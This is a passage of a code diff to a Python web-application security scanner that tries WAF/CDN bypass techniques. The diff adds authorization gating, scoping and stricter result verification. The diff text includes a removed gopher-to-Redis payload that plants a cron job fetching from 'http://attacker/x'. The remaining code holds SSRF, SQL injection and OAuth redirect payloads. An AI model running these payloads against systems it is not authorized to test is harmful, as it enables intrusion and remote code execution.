         for sub in found_subdomains:
-            # Check if subdomain might lack WAF protection
-            is_potentially_unprotected = sub['server'].lower() not in ['cloudflare', 'cloudfront', 'akamai']
-            
             result = {
                 'technique': f"Subdomain: {sub['subdomain']}",
-                'bypass': is_potentially_unprotected,
+                'bypass': False,
                 'status': sub['status'],
                 'reason': f"IP: {sub['ip']} | Server: {sub['server']}",
-                'severity': 'MEDIUM' if is_potentially_unprotected else 'INFO',
+                'severity': 'INFO',
                 'category': 'SUBDOMAIN_ENUM',
+                'kind': 'observation', 'verification_status': 'informational',
+                'confidence': 'high',
                 'details': sub
             }
             results.append(result)
-            
-            status_icon = "[✓]" if is_potentially_unprotected else "[+]"
-            print(f"  {status_icon} Found: {sub['subdomain']} ({sub['ip']})")
+            print(f"  [+] Found: {sub['subdomain']} ({sub['ip']})")
         
         if not found_subdomains:
             print("  [*] No additional subdomains found via DNS enumeration")
@@ -9239,16 +10458,18 @@ class CloudFrontBypasser(ExtraTechniques):
         
         # Note: These are public APIs that may have rate limits
         dns_history_sources = [
-            f"https://api.hackertarget.com/dnslookup/?q={self.domain}",
-            f"https://api.hackertarget.com/hostsearch/?q={self.domain}",
+            f"https://api.hackertarget.com/dnslookup/?q={urlparse(self.target).hostname or self.domain}",
+            f"https://api.hackertarget.com/hostsearch/?q={urlparse(self.target).hostname or self.domain}",
         ]
         
         found_records = []
         
         for source in dns_history_sources:
             try:
-                resp = self._session.get(source, timeout=10, verify=False)
-                if resp and resp.status_code == 200 and 'error' not in resp.text.lower():
+                resp = self._scoped_safe_request(
+                    source, timeout=10, passive_lookup=True
+                )
+                if resp is not None and resp.status_code == 200 and 'error' not in resp.text.lower():
                     lines = resp.text.strip().split('\n')
                     for line in lines[:10]:  # Limit results
                         if line and ',' in line:
@@ -9262,26 +10483,22 @@ class CloudFrontBypasser(ExtraTechniques):
             except Exception as e:
                 logger.debug(f"DNS history lookup error: {e}")
         
-        # Try to identify origin IPs (non-CDN IPs)
-        cdn_ip_ranges = ['104.16.', '104.17.', '104.18.', '13.', '52.', '54.']  # Common CDN ranges
-        
         for record in found_records:
             ip = record['ip']
-            is_cdn = any(ip.startswith(prefix) for prefix in cdn_ip_ranges)
-            
             result = {
                 'technique': f"Historical DNS: {record['host']}",
-                'bypass': not is_cdn,
+                'bypass': False,
                 'status': 200,
-                'reason': f"IP: {ip} | Source: {record['source']}",
-                'severity': 'HIGH' if not is_cdn else 'INFO',
+                'reason': (f"Historical IP: {ip} | Source: {record['source']} | "
+                           "origin identity and protection are unverified"),
+                'severity': 'INFO',
                 'category': 'DNS_HISTORY',
+                'kind': 'observation', 'verification_status': 'informational',
+                'confidence': 'medium',
                 'details': record
             }
             results.append(result)
-            
-            if not is_cdn:
-                print(f"  [✓] Potential Origin IP: {ip} ({record['host']})")
+            print(f"  [+] Historical DNS record: {ip} ({record['host']})")
         
         if not found_records:
             print("  [*] No historical DNS records found via public APIs")
@@ -9294,18 +10511,17 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Checking Certificate Transparency logs...")
         
         # Extract base domain
-        domain_parts = self.domain.split('.')
-        if len(domain_parts) >= 2:
-            base_domain = '.'.join(domain_parts[-2:])
-        else:
-            base_domain = self.domain
+        target_hostname = urlparse(self.target).hostname or self.domain
+        base_domain = target_hostname
         
         try:
             # Use crt.sh API (Certificate Transparency)
             ct_url = f"https://crt.sh/?q=%.{base_domain}&output=json"
-            resp = self._session.get(ct_url, timeout=15, verify=False)
+            resp = self._scoped_safe_request(
+                ct_url, timeout=15, passive_lookup=True
+            )
             
-            if resp and resp.status_code == 200:
+            if resp is not None and resp.status_code == 200:
                 try:
                     certs = resp.json()
                     
@@ -9315,11 +10531,12 @@ class CloudFrontBypasser(ExtraTechniques):
                         name_value = cert.get('name_value', '')
                         for domain in name_value.split('\n'):
                             domain = domain.strip().lstrip('*.')
-                            if domain and base_domain in domain:
+                            if (domain == base_domain or
+                                    domain.endswith(f'.{base_domain}')):
                                 domains_found.add(domain)
                     
                     # Filter out the main domain and duplicates
-                    domains_found.discard(self.domain)
+                    domains_found.discard(target_hostname)
                     domains_found.discard(f'www.{base_domain}')
                     
                     for domain in list(domains_found)[:20]:  # Limit results
@@ -9407,9 +10624,9 @@ class CloudFrontBypasser(ExtraTechniques):
                     if 'Azure' in cloud_type:
                         headers['Metadata'] = 'true'
                     
-                    resp = safe_request(test_url, headers=headers, timeout=3)
+                    resp = self._scoped_safe_request(test_url, headers=headers, timeout=3)
                     
-                    if resp and resp.status_code == 200:
+                    if resp is not None and resp.status_code == 200:
                         # Check for metadata indicators
                         body = resp.text.lower()
                         if any(ind in body for ind in ['ami-', 'instance-id', 'local-ipv4', 'access_token', 'project-id', 'subscription']):
@@ -9438,8 +10655,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Fingerprinting technology stack...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             body_lower = resp.text.lower()
@@ -9594,8 +10811,29 @@ class CloudFrontBypasser(ExtraTechniques):
                 try:
                     r = self._test_request(headers=dict(headers), method='POST',
                                            path=path, technique=f'JSON-SQLi {path}',
-                                           data=json.dumps(payload))
-                    if r and (r.get('bypass') or 'sql' in str(r.get('reason', '')).lower()):
+                                           data=json.dumps(payload),
+                                           probe={
+                                               'category': 'INJECTION',
+                                               'payload': json.dumps(payload),
+                                               'insertion_point': {
+                                                   'type': 'json-body',
+                                                   'name': next(iter(payload), 'body'),
+                                               },
+                                               'detector_id': 'json-sqli-error-v2',
+                                               'oracle': {
+                                                   'type': 'regex',
+                                                   'patterns': [
+                                                       r'you have an error in your sql syntax',
+                                                       r'syntax error at or near', r'ora-\d{5}',
+                                                       r'unclosed quotation mark',
+                                                       r'sqlite(?:3)?(?::| error)',
+                                                   ],
+                                                   'severity': 'HIGH',
+                                                   'reason': ('Database error appeared only after '
+                                                              'the JSON SQL probe'),
+                                               },
+                                           })
+                    if self._result_has_evidence(r, 'response_signature'):
                         r['category'] = 'INJECTION'
                         r['technique'] = f'JSON-SQLi bypass: {json.dumps(payload)[:40]}'
                         results.append(r)
@@ -9680,36 +10918,54 @@ class CloudFrontBypasser(ExtraTechniques):
         # Discover OIDC config (no auth needed) — informational.
         for cfg in ['/.well-known/openid-configuration', '/.well-known/oauth-authorization-server']:
             try:
-                resp = safe_request(f"{self.target}{cfg}", timeout=self.timeout, allow_redirects=True)
-                if resp and resp.status_code == 200 and 'authorization_endpoint' in resp.text:
+                resp = self._scoped_safe_request(f"{self.target}{cfg}", timeout=self.timeout, allow_redirects=True)
+                if resp is not None and resp.status_code == 200 and 'authorization_endpoint' in resp.text:
                     results.append({
-                        'technique': f'OIDC config exposed: {cfg}', 'bypass': True,
-                        'status': resp.status_code, 'reason': 'OpenID configuration is publicly readable',
+                        'technique': f'OIDC discovery document: {cfg}', 'bypass': False,
+                        'status': resp.status_code,
+                        'reason': 'Public OpenID configuration discovered (normal OIDC behavior)',
                         'severity': 'INFO', 'category': 'OAUTH',
+                        'kind': 'observation', 'verification_status': 'informational',
+                        'confidence': 'high',
                     })
             except Exception as e:
                 logger.debug(f"OIDC discovery error: {e}")
         # redirect_uri open-redirect style bypasses on common authorize endpoints.
-        evil = 'https://evil.example.com'
+        controlled_host = 'blackthorn.invalid'
+        evil = f'https://{controlled_host}/callback'
         redirect_variants = [
-            evil, f'{self.target}.evil.example.com', f'{evil}#@{self.domain}',
-            f'{evil}%2f%2e%2e', f'{self.target}@evil.example.com', f'//evil.example.com',
+            evil,
+            f'//{controlled_host}/callback',
+            f'https://{urlparse(self.target).hostname}@{controlled_host}/callback',
+            f'https://{urlparse(self.target).hostname}.{controlled_host}/callback',
         ]
         authorize_eps = ['/oauth/authorize', '/authorize', '/connect/authorize', '/oauth2/authorize']
         test_cases = []
         for ep in authorize_eps:
             for ru in redirect_variants:
                 path = f"{ep}?response_type=code&client_id=test&redirect_uri={quote(ru, safe='')}"
-                test_cases.append({'headers': {}, 'path': path,
-                                   'technique': f'OAuth redirect_uri bypass {ep}: {ru[:30]}'})
+                test_cases.append({
+                    'headers': {}, 'path': path,
+                    'technique': f'OAuth redirect_uri bypass {ep}: {ru[:30]}',
+                    'category': 'OAUTH', 'payload': ru, 'parameter': 'redirect_uri',
+                    'detector_id': 'oauth-external-location-v2',
+                    'oracle': {
+                        'type': 'redirect', 'host': controlled_host,
+                        'base_url': self.target,
+                        'severity': 'HIGH',
+                        'reason': ('Authorization endpoint redirected to the exact '
+                                   'controlled external host'),
+                    },
+                })
         batch = self._batch_test(test_cases, verbose=False)
-        # Flag responses that 302 to the attacker-controlled redirect.
+        # The exact Location header oracle rejects ordinary login/error redirects.
         for r in batch:
-            r['category'] = 'OAUTH'
-            if r.get('status') in (301, 302, 303, 307, 308):
-                r['bypass'] = True
-                r['severity'] = 'HIGH'
-                r['reason'] = 'authorize endpoint redirects with attacker redirect_uri'
+            location = str((r.get('response') or {}).get('headers', {}).get('location', ''))
+            resolved = urlparse(urljoin(self.target, location))
+            if (self._result_has_evidence(r, 'external_redirect')
+                    and resolved.hostname
+                    and (resolved.hostname == controlled_host
+                         or resolved.hostname.endswith('.' + controlled_host))):
                 results.append(r)
         return results
 
@@ -9719,8 +10975,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Scanning JS bundles for exposed secrets...")
         try:
             from .crawler import _LinkFormParser
-            root = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not root or root.status_code >= 400:
+            root = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if root is None or root.status_code >= 400:
                 return results
             parser = _LinkFormParser()
             try:
@@ -9737,8 +10993,8 @@ class CloudFrontBypasser(ExtraTechniques):
             js_urls = list(dict.fromkeys(js_urls))[:20]
             compiled = {n: re.compile(p) for n, p in JS_SECRET_PATTERNS.items()}
             for ju in js_urls:
-                resp = safe_request(ju, timeout=self.timeout)
-                if not resp or resp.status_code >= 400:
+                resp = self._scoped_safe_request(ju, timeout=self.timeout)
+                if resp is None or resp.status_code >= 400:
                     continue
                 content = resp.text
                 for name, pat in compiled.items():
@@ -9763,8 +11019,8 @@ class CloudFrontBypasser(ExtraTechniques):
         results = []
         print("  [*] Fingerprinting versions against known CVEs...")
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             # Gather version-bearing strings.
             candidates = []
@@ -9782,13 +11038,23 @@ class CloudFrontBypasser(ExtraTechniques):
                         continue
                     seen.add(cve)
                     results.append({
-                        'technique': f'Known CVE: {cve} ({product})', 'bypass': True,
+                        'technique': f'Potentially affected version: {cve} ({product})',
+                        'bypass': False,
                         'status': resp.status_code,
-                        'reason': f'{note} — version matches {cve}',
-                        'severity': severity, 'category': 'CVE_FINGERPRINT',
-                        'details': {'product': product, 'cve': cve, 'note': note},
+                        'reason': (f'{note} — the exposed version matches {cve}, but '
+                                   'backports, build, and vulnerable configuration are unverified'),
+                        'severity': 'INFO', 'category': 'CVE_FINGERPRINT',
+                        'kind': 'observation', 'verification_status': 'informational',
+                        'confidence': 'medium',
+                        'evidence': [{
+                            'type': 'version_banner_match',
+                            'description': 'Version/banner matched a potentially affected range',
+                            'matched': f'{product} / {cve}',
+                        }],
+                        'details': {'product': product, 'cve': cve, 'note': note,
+                                    'potential_severity': severity},
                     })
-                    print(f"  [✓] {severity}: {cve} ({product}) — {note}")
+                    print(f"  [i] Version candidate: {cve} ({product}); active proof not run")
         except Exception as e:
             logger.debug(f"CVE fingerprint error: {e}")
         return results
@@ -9879,8 +11145,8 @@ class CloudFrontBypasser(ExtraTechniques):
             for path, params, pname in test_targets[:6]:
                 try:
                     inj = build_injection_path(path, params, pname, murl)
-                    resp = safe_request(f"{self.target}{inj}", timeout=self.timeout + 2)
-                    if resp and resp.status_code < 400 and any(ind in resp.text for ind in meta_indicators):
+                    resp = self._scoped_safe_request(f"{self.target}{inj}", timeout=self.timeout + 2)
+                    if resp is not None and resp.status_code < 400 and any(ind in resp.text for ind in meta_indicators):
                         results.append({
                             'technique': f'Cloud metadata SSRF: {provider}', 'bypass': True,
                             'status': resp.status_code,
@@ -9915,13 +11181,8 @@ class CloudFrontBypasser(ExtraTechniques):
                     payload += f"${len(part)}\r\n{part}\r\n"
             return 'gopher://127.0.0.1:6379/_' + quote(payload, safe='')
         return {
-            'redis_set_key': _redis(['SET wafpierce poc', 'CONFIG GET dir']),
+            'redis_ping': _redis(['PING']),
             'redis_info': _redis(['INFO']),
-            'redis_cron_rce': _redis([
-                'SET cron "\\n* * * * * curl http://attacker/x\\n"',
-                'CONFIG SET dir /var/spool/cron/',
-                'CONFIG SET dbfilename root', 'SAVE',
-            ]),
             'mysql_handshake_probe': 'gopher://127.0.0.1:3306/_' + quote('\x00', safe=''),
         }
 
@@ -9941,8 +11202,10 @@ class CloudFrontBypasser(ExtraTechniques):
         # Calibrate against a definitely-missing path to detect soft-404s.
         soft404_size = None
         try:
-            cal = self._session.get(f"{self.target}/wafp_{hashlib.md5(self.target.encode()).hexdigest()[:8]}_404",
-                                    timeout=self.timeout, allow_redirects=False, verify=False)
+            cal = self._scoped_safe_request(
+                f"{self.target}/blackthorn_{hashlib.md5(self.target.encode()).hexdigest()[:8]}_404",
+                timeout=self.timeout, allow_redirects=False,
+            )
             if cal is not None and cal.status_code == 200:
                 soft404_size = len(cal.content)
         except Exception:
@@ -9950,7 +11213,9 @@ class CloudFrontBypasser(ExtraTechniques):
 
         test_cases = [{'headers': {}, 'path': '/' + w.lstrip('/'),
                        'technique': f'Content: /{w.lstrip("/")}'} for w in words]
-        batch = self._batch_test(test_cases, verbose=False)
+        batch = self._batch_test(
+            test_cases, verbose=False, include_observations=True
+        )
         for r in batch:
             status = r.get('status', 0)
             if status in (200, 201, 204, 301, 302, 307, 401, 403):
@@ -9959,10 +11224,12 @@ class CloudFrontBypasser(ExtraTechniques):
                     continue
                 sev = 'MEDIUM' if status in (200, 401, 403) else 'LOW'
                 results.append({
-                    'technique': f'Discovered: {r["path"]}', 'bypass': status in (200, 401, 403),
+                    'technique': f'Discovered: {r["path"]}', 'bypass': False,
                     'status': status, 'size': r.get('size', 0),
-                    'reason': f'Accessible resource ({status})', 'severity': sev,
-                    'category': 'CONTENT_DISCOVERY', 'path': r['path'],
+                    'reason': f'Resource candidate responded with HTTP {status}',
+                    'severity': 'INFO', 'category': 'CONTENT_DISCOVERY',
+                    'kind': 'observation', 'verification_status': 'informational',
+                    'confidence': 'high', 'path': r['path'],
                 })
         if results:
             print(f"  [+] Content discovery found {len(results)} resource(s)")
@@ -9989,7 +11256,7 @@ class CloudFrontBypasser(ExtraTechniques):
         def _probe(bucket):
             url = f"https://{bucket}.s3.amazonaws.com/"
             try:
-                resp = self._session.get(url, timeout=self.timeout, verify=False)
+                resp = self._scoped_safe_request(url, timeout=self.timeout)
             except Exception:
                 return None
             if resp is None:
@@ -10043,6 +11310,25 @@ class CloudFrontBypasser(ExtraTechniques):
         return triage_results(provider, self.target, self.results,
                               api_key=api_key, model=model, base_url=base_url)
 
+    def _browser_session_context(self) -> Tuple[Dict[str, str], List[Dict[str, Any]]]:
+        """Transfer the authenticated target session into an isolated browser context."""
+        headers = {
+            str(k): str(v) for k, v in self._session.headers.items()
+            if str(k).lower() not in {'cookie', 'content-length', 'host'}
+        }
+        hostname = urlparse(self.target).hostname or self.domain
+        cookies = []
+        for cookie in self._session.cookies:
+            item = {
+                'name': cookie.name,
+                'value': cookie.value,
+                'domain': cookie.domain or hostname,
+                'path': cookie.path or '/',
+                'secure': bool(cookie.secure),
+            }
+            cookies.append(item)
+        return headers, cookies
+
     def _test_dom_xss(self) -> List[Dict[str, Any]]:
         """DOM-based XSS detection (optional, requires Playwright)."""
         try:
@@ -10054,7 +11340,11 @@ class CloudFrontBypasser(ExtraTechniques):
             return []
         print("  [*] Testing DOM XSS (headless browser)...")
         try:
-            return run_dom_xss(self.target, self.crawl_targets, timeout=self.timeout)
+            headers, cookies = self._browser_session_context()
+            return run_dom_xss(
+                self.target, self.crawl_targets, timeout=self.timeout,
+                headers=headers, cookies=cookies,
+            )
         except Exception as e:
             logger.debug(f"DOM XSS error: {e}")
             return []
@@ -10070,7 +11360,11 @@ class CloudFrontBypasser(ExtraTechniques):
             return []
         print("  [*] Testing Client-Side Path Traversal (headless browser)...")
         try:
-            return run_client_side_path_traversal(self.target, self.crawl_targets, timeout=self.timeout)
+            headers, cookies = self._browser_session_context()
+            return run_client_side_path_traversal(
+                self.target, self.crawl_targets, timeout=self.timeout,
+                headers=headers, cookies=cookies,
+            )
         except Exception as e:
             logger.debug(f"CSPT error: {e}")
             return []
@@ -10207,14 +11501,27 @@ def _print_category_list() -> None:
 
 def _print_technique_list() -> None:
     skip = getattr(CloudFrontBypasser, 'SAFE_MODE_SKIP', set())
+    intrusive = getattr(CloudFrontBypasser, 'INTRUSIVE_WORKFLOW_SKIP', set())
+    disabled = (
+        getattr(CloudFrontBypasser, 'DISABLED_TRANSPORT_TECHNIQUES', set())
+        | getattr(CloudFrontBypasser, 'DISABLED_ACCURACY_TECHNIQUES', set())
+    )
     total = 0
-    print("Techniques by category ('*' = skipped under --safe-mode):\n")
+    print("Techniques by category (* safe-mode skip, ! requires --intrusive, "
+          "x disabled pending a proof-capable engine):\n")
     for key, cat in SCAN_CATEGORIES.items():
         techs = cat.get('techniques', [])
         total += len(techs)
         print(f"[{key}] {cat.get('name', '')}")
         for t in techs:
-            mark = ' *' if t in skip else ''
+            marks = []
+            if t in skip:
+                marks.append('*')
+            if t in intrusive:
+                marks.append('!')
+            if t in disabled:
+                marks.append('x')
+            mark = f" [{' '.join(marks)}]" if marks else ''
             print(f"    - {_pretty_technique(t)}{mark}")
         print()
     print(f"{total} techniques across {len(SCAN_CATEGORIES)} categories.")
@@ -10244,6 +11551,31 @@ def _apply_profile(args) -> None:
             setattr(args, key, value)
 
 
+def _is_actionable_result(result: Dict[str, Any]) -> bool:
+    """Whether a result should count as a confirmed security finding/CI failure.
+
+    Legacy results without the new state fields retain their previous behavior;
+    explicit candidates and observations never fail a pipeline.
+    """
+    kind = str(result.get('kind') or '').lower()
+    verification = str(result.get('verification_status') or '').lower()
+    if not kind and str(result.get('category') or '').upper() in {
+        'WAF_DETECTION', 'CDN_DETECTION', 'OS_DETECTION', 'API_DISCOVERY',
+        'TECH_STACK', 'CT_LOGS', 'SUBDOMAIN_ENUM',
+    }:
+        return False
+    if kind in ('observation', 'coverage', 'suspected'):
+        return False
+    if verification in (
+        'candidate', 'not_detected', 'informational', 'unconfirmed', 'error'
+    ):
+        return False
+    if kind == 'finding' or verification == 'confirmed':
+        return bool(result.get('bypass', True))
+    # Backwards compatibility for older/plugin findings without state metadata.
+    return True
+
+
 def _fail_on_exit(results, fail_on) -> 'Optional[int]':
     """CI gating: return exit code 10 if any finding is at or above ``fail_on``
     severity, else ``None`` (caller uses its normal exit code)."""
@@ -10253,7 +11585,11 @@ def _fail_on_exit(results, fail_on) -> 'Optional[int]':
     if thr is None:
         return None
     rank = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
-    if any(rank.get((r.get('severity') or 'INFO').upper(), 4) <= thr for r in results):
+    if any(
+        _is_actionable_result(r) and
+        rank.get((r.get('severity') or 'INFO').upper(), 4) <= thr
+        for r in results
+    ):
         return 10
     return None
 
@@ -10264,7 +11600,12 @@ def _print_dry_run_plan(args, no_color: bool = False) -> None:
     if invalid:
         print(f"[!] Unknown categories ignored: {', '.join(invalid)}")
     cats = selected or list(SCAN_CATEGORIES.keys())
-    skip = getattr(CloudFrontBypasser, 'SAFE_MODE_SKIP', set()) if args.safe_mode else set()
+    skip = set(getattr(CloudFrontBypasser, 'DISABLED_TRANSPORT_TECHNIQUES', set()))
+    skip.update(getattr(CloudFrontBypasser, 'DISABLED_ACCURACY_TECHNIQUES', set()))
+    if not getattr(args, 'intrusive', False):
+        skip.update(getattr(CloudFrontBypasser, 'INTRUSIVE_WORKFLOW_SKIP', set()))
+    if args.safe_mode:
+        skip.update(getattr(CloudFrontBypasser, 'SAFE_MODE_SKIP', set()))
 
     proxies = []
     if getattr(args, 'proxy_pool', None):
@@ -10282,7 +11623,9 @@ def _print_dry_run_plan(args, no_color: bool = False) -> None:
     print(f"  threads={args.threads}  delay={args.delay}s  timeout={args.timeout}s"
           f"  jitter={args.jitter}s")
     print(f"  impersonate={args.impersonate or 'off'}  oob={args.oob}"
-          f"  safe_mode={'on' if args.safe_mode else 'off'}  resume={'on' if args.resume else 'off'}")
+          f"  safe_mode={'on' if args.safe_mode else 'off'}"
+          f"  intrusive={'on' if getattr(args, 'intrusive', False) else 'off'}"
+          f"  resume={'on' if args.resume else 'off'}")
     print(f"  crawl={'off' if args.no_crawl else 'on'}  schema={'off' if args.no_schema else 'on'}"
           f"  reconfirm={'off' if args.no_reconfirm else f'on(x{args.reconfirm_samples})'}"
           f"  db_extras={'off' if args.no_db_extras else 'on'}")
@@ -10305,12 +11648,13 @@ def _print_dry_run_plan(args, no_color: bool = False) -> None:
         skipped += len(techs) - len(running)
         total += len(running)
         print(f"  [{key}] {cat.get('name', '')} - {len(running)} run"
-              + (f", {len(techs) - len(running)} skipped(safe-mode)" if (len(techs) - len(running)) else ""))
+              + (f", {len(techs) - len(running)} skipped(guards)"
+                 if (len(techs) - len(running)) else ""))
         for t in running:
             print(f"      - {_pretty_technique(t)}")
 
     print(f"\nTotal: {total} techniques would run"
-          + (f" ({skipped} skipped by --safe-mode)" if skipped else "")
+          + (f" ({skipped} skipped by safety/accuracy guards)" if skipped else "")
           + f" across {len([k for k in cats if k in SCAN_CATEGORIES])} categories.")
     print("(dry run - no requests were sent)")
 
@@ -10404,6 +11748,9 @@ def main(argv=None):
                        help='Never test discovered URLs matching this regex (repeatable)')
     parser.add_argument('--safe-mode', action='store_true',
                        help='Skip noisy/DoS-flavored and state-changing techniques')
+    parser.add_argument('--intrusive', action='store_true',
+                       help='Explicitly enable guessed state-changing workflows (uploads, '
+                            'emails, race/cache tests). Requires separate impact authorization.')
     parser.add_argument('--authorize', metavar='FILE',
                        help='Path to an allowlist of authorized hosts/URL patterns (one per '
                             'line, globs ok). The target must match before any test runs.')
@@ -10516,9 +11863,11 @@ def main(argv=None):
 
     # Authorization gate: when an allowlist is supplied, the target's host must
     # match before any active test runs (fail-closed on empty/unreadable list).
+    authorization_patterns = []
     if args.authorize:
         from .authorization import load_allowlist, is_authorized
-        if not is_authorized(args.target, load_allowlist(args.authorize)):
+        authorization_patterns = load_allowlist(args.authorize)
+        if not is_authorized(args.target, authorization_patterns):
             print(f"[!] '{args.target}' is not in the authorization allowlist "
                   f"({args.authorize}); refusing to scan.")
             return 5
@@ -10625,6 +11974,8 @@ def main(argv=None):
             auth=auth or None, oob=oob_provider, impersonate=args.impersonate,
             scope=scope or None, safe_mode=args.safe_mode, jitter=args.jitter,
             proxy_pool=proxy_pool or None, seed_targets=seed_targets or None,
+            intrusive=args.intrusive,
+            authorization_patterns=authorization_patterns,
         )
         scanner.reconfirm = not args.no_reconfirm
         scanner.reconfirm_samples = max(1, args.reconfirm_samples)
@@ -10636,7 +11987,8 @@ def main(argv=None):
         try:
             from .authorization import audit_log
             audit_log('scan_start', target=args.target, categories=selected_categories,
-                      safe_mode=args.safe_mode, authorized=bool(args.authorize))
+                      safe_mode=args.safe_mode, intrusive=args.intrusive,
+                      authorized=bool(args.authorize))
         except Exception:
             pass
 
@@ -10645,17 +11997,6 @@ def main(argv=None):
 
         # CI gating: optionally exit non-zero (10) when findings reach a severity.
         fail_exit = _fail_on_exit(results, args.fail_on)
-
-        # Redact secrets (cookies/tokens/auth) from anything persisted or sent,
-        # unless explicitly disabled. The console summary uses raw `results`.
-        if args.no_redact:
-            out_results = results
-        else:
-            try:
-                from .redaction import redact_findings
-                out_results = redact_findings(results)
-            except Exception:
-                out_results = results
 
         try:
             from .authorization import audit_log
@@ -10678,11 +12019,38 @@ def main(argv=None):
             except Exception as e:
                 logger.debug(f"AI triage error: {e}")
 
+        # Redact only after all annotations are attached so saved/exported
+        # artifacts include AI triage metadata. If redaction ever fails, emit a
+        # deliberately small safe record instead of falling back to raw secrets.
+        if args.no_redact:
+            out_results = results
+        else:
+            try:
+                from .redaction import redact_findings
+                out_results = redact_findings(results)
+            except Exception as exc:
+                logger.error(f"Result redaction failed closed: {exc}")
+                print("[!] Result redaction failed; sensitive request evidence was omitted")
+                safe_keys = {
+                    'finding_id', 'fingerprint', 'title', 'technique', 'category',
+                    'severity', 'kind', 'verification_status', 'confidence',
+                    'reason', 'remediation', 'status', 'method', 'path',
+                    'observed_at',
+                }
+                out_results = [
+                    {key: value for key, value in result.items() if key in safe_keys}
+                    if isinstance(result, dict) else {'title': 'Redacted result'}
+                    for result in results
+                ]
+
         # Extra export artifact (SARIF / Nuclei / HTML / JSON).
         if args.export:
             try:
                 from .exporters import export as _export
-                _export(out_results, args.target, args.export_format, args.export)
+                _export(
+                    out_results, args.target, args.export_format, args.export,
+                    redact=not args.no_redact,
+                )
                 print(f"[+] Exported {args.export_format.upper()} to {args.export}")
             except Exception as e:
                 print(f"[!] Export failed: {e}")
@@ -10738,7 +12106,9 @@ def main(argv=None):
             if args.output:
                 with open(args.output, 'w', encoding='utf-8') as f:
                     json.dump(out_results, f, indent=2)
-            sys.exit(fail_exit if fail_exit is not None else (0 if len(results) == 0 else 1))
+            sys.exit(fail_exit if fail_exit is not None else (
+                0 if not any(_is_actionable_result(r) for r in results) else 1
+            ))
 
         # Continuous monitoring: diff against the previous scan of this target.
         if args.monitor:
@@ -10750,20 +12120,35 @@ def main(argv=None):
             except Exception as e:
                 logger.debug(f"Monitor error: {e}")
 
-        # Group by severity (needed for both quiet and verbose summaries).
-        critical = [r for r in results if r.get('severity') == 'CRITICAL']
-        high = [r for r in results if r.get('severity') == 'HIGH']
-        medium = [r for r in results if r.get('severity') == 'MEDIUM']
-        low = [r for r in results if r.get('severity') == 'LOW']
-        info = [r for r in results if r.get('severity') == 'INFO']
-        bypasses = [r for r in results if r.get('bypass', False)]
+        # Confirmed findings can fail CI. Candidates remain visible, but are kept
+        # separate so an unverified heuristic never changes the process exit code.
+        actionable = [r for r in results if _is_actionable_result(r)]
+        critical = [r for r in actionable if r.get('severity') == 'CRITICAL']
+        high = [r for r in actionable if r.get('severity') == 'HIGH']
+        medium = [r for r in actionable if r.get('severity') == 'MEDIUM']
+        low = [r for r in actionable if r.get('severity') == 'LOW']
+        info = [r for r in actionable if r.get('severity') == 'INFO']
+        confirmed = list(actionable)
+        candidates = [
+            r for r in results
+            if bool(r.get('bypass')) and (
+                str(r.get('verification_status') or '').lower() == 'candidate'
+                or str(r.get('kind') or '').lower() == 'suspected'
+            )
+        ]
+        candidate_ids = {id(r) for r in candidates}
+        observations = [
+            r for r in results
+            if not _is_actionable_result(r) and id(r) not in candidate_ids
+        ]
         detections = [r for r in results if r.get('category') in ['WAF_DETECTION', 'CDN_DETECTION', 'API_DISCOVERY']]
 
         if quiet:
             # One-line, pipe-friendly summary.
-            print(f"Found {len(results)} findings "
+            print(f"Found {len(confirmed)} confirmed findings "
                   f"(CRITICAL={len(critical)} HIGH={len(high)} MEDIUM={len(medium)} "
-                  f"LOW={len(low)} INFO={len(info)}; bypasses={len(bypasses)})")
+                  f"LOW={len(low)} INFO={len(info)}; confirmed={len(confirmed)} "
+                  f"candidates={len(candidates)} observations={len(observations)})")
         else:
             # Emoji decoration unless --no-color / NO_COLOR.
             sev_icon = {
@@ -10776,13 +12161,15 @@ def main(argv=None):
                 'clean': '[OK] ' if no_color else '✅ ',
             }
             print(f"\n{'='*60}")
-            print(f"[+] Scan Complete: Found {len(results)} findings")
+            print(f"[+] Scan Complete: {len(confirmed)} confirmed finding(s), "
+                  f"{len(candidates)} candidate(s), {len(observations)} observation(s)")
             print(f"{'='*60}\n")
 
-            if results:
+            if actionable or candidates:
                 print(f"{sev_icon['summary']}Summary:")
-                print(f"   Total Findings: {len(results)}")
-                print(f"   Actual Bypasses: {len(bypasses)}")
+                print(f"   Confirmed: {len(confirmed)}")
+                print(f"   Candidates needing verification: {len(candidates)}")
+                print(f"   Observations / negative probes: {len(observations)}")
                 print(f"   Edge Security Detections: {len(detections)}")
                 print()
                 for label, group, always_reason in (
@@ -10796,8 +12183,14 @@ def main(argv=None):
                         print(f"  - {r['technique']}")
                         if always_reason or r.get('reason'):
                             print(f"    Reason: {r.get('reason', '')}")
+                if candidates:
+                    print(f"\n[VERIFY] CANDIDATES ({len(candidates)}):")
+                    for r in candidates:
+                        print(f"  - {r.get('technique', 'Candidate')}")
+                        if r.get('reason'):
+                            print(f"    Reason: {r['reason']}")
             else:
-                print(f"{sev_icon['clean']}No bypasses found - target is properly protected")
+                print(f"{sev_icon['clean']}No security finding or candidate was detected")
 
         # Save results
         if args.output:
@@ -10810,7 +12203,7 @@ def main(argv=None):
             print(f"\n[!] --fail-on {args.fail_on}: threshold met -> exit {fail_exit}")
 
         # Return appropriate exit code
-        sys.exit(fail_exit if fail_exit is not None else (0 if len(results) == 0 else 1))
+        sys.exit(fail_exit if fail_exit is not None else (0 if len(actionable) == 0 else 1))
     
     except InvalidTargetError as e:
         print(f"[!] Invalid target: {e}")
